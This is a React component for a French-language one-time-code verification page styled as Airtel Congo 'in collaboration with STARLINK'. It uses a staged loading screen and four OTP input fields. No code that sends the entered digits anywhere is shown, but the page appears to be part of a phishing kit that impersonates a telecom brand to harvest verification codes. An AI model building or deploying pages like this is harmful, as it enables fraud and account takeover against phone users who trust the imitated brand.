import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2 } from 'lucide-react';
import airtelLogo from '@assets/image_1784479304453.png';

export default function Verify() {
  const [loading, setLoading] = useState(true);
  const [otp, setOtp] = useState(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(30);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // We normally get this from history state, defaulting if direct navigation
  const phoneNumber = history.state?.usr?.phoneNumber || '+243951234567';

  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (loading) return;
    
    if (timeLeft > 0) {
      const intervalId = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(intervalId);
    }
  }, [timeLeft, loading]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newOtp = [...otp];
    // take only last character if they pasted
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);

    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').slice(0, 4).replace(/\D/g, '');
    if (!pastedData) return;

    const newOtp = [...otp];
    for (let i = 0; i < pastedData.length; i++) {
      newOtp[i] = pastedData[i];
    }
    setOtp(newOtp);
    
    // Focus next empty input or last input
    const nextIndex = Math.min(pastedData.length, 3);
    inputRefs.current[nextIndex]?.focus();
  };

  return (
    <div className="min-h-[100dvh] flex flex-col bg-background font-sans items-center justify-center relative overflow-hidden">
      
      <AnimatePresence mode="wait">
        {loading ? (
          <motion.div 
            key="loading"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center justify-center p-6 text-center"
            data-testid="view-loading"
          >
            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-12 animate-pulse" />
            
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
            
            <h2 className="text-2xl font-bold text-foreground mb-2" data-testid="text-loading-title">
              Veuillez patienter...
            </h2>
            <p className="text-muted-foreground font-medium" data-testid="text-loading-subtitle">
              Cela prend généralement quelques secondes
            </p>
          </motion.div>
        ) : (
          <motion.div 
            key="otp"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ type: "spring", damping: 25, stiffness: 200 }}
            className="w-full max-w-md px-4 flex flex-col items-center"
            data-testid="view-otp"
          >
            <div className="w-full bg-card rounded-3xl shadow-sm border border-card-border p-8 mb-8 text-center">
              <h1 className="text-2xl font-black text-foreground mb-2 tracking-tight" data-testid="text-otp-title">
                Vérification OTP
              </h1>
              <p className="text-muted-foreground text-sm font-medium mb-6" data-testid="text-otp-subtitle">
                Entrez l'OTP envoyé à votre numéro de téléphone<br/>
                <strong className="text-foreground text-base mt-2 inline-block font-bold">{phoneNumber}</strong>
              </p>

              <div className="mb-8">
                <label className="block text-sm font-bold text-foreground mb-4" data-testid="label-otp">
                  Entrer l'OTP à 4 chiffres
                </label>
                <div className="flex justify-center gap-3 md:gap-4" onPaste={handlePaste}>
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="\d*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-14 h-16 md:w-16 md:h-20 text-center text-3xl font-black rounded-2xl border-2 border-input bg-secondary/30 focus:bg-card focus:border-primary focus:ring-4 focus:ring-primary/20 outline-none transition-all"
                      data-testid={`input-otp-${index}`}
                    />
                  ))}
                </div>
              </div>

              <button
                className="w-full bg-primary text-primary-foreground font-bold text-lg py-4 rounded-xl transition-transform active:scale-[0.98] hover:bg-primary/90 shadow-md shadow-primary/20 disabled:opacity-50 disabled:pointer-events-none"
                disabled={otp.some(d => !d)}
                data-testid="button-verify-submit"
              >
                CONFIRMER
              </button>
              
              <div className="mt-6 text-sm font-medium text-muted-foreground" data-testid="text-countdown">
                {timeLeft > 0 ? (
                  <span>Le code expire dans <strong className="text-foreground">{timeLeft}</strong> secondes</span>
                ) : (
                  <button className="text-primary hover:underline font-bold transition-all">Renvoyer le code OTP</button>
                )}
              </div>
            </div>

            <div className="flex flex-col items-center gap-4 mt-auto text-center opacity-80">
              <span className="text-xs font-bold text-muted-foreground uppercase tracking-wider" data-testid="text-partner-verify">
                En collaboration avec STARLINK™
              </span>
              <img src={airtelLogo} alt="Airtel Logo" className="h-8 w-auto object-contain grayscale" />
              <p className="text-xs font-medium text-muted-foreground mt-4" data-testid="text-footer-copyright">
                © 2026 Airtel Congo. Tous droits réservés.
              </p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
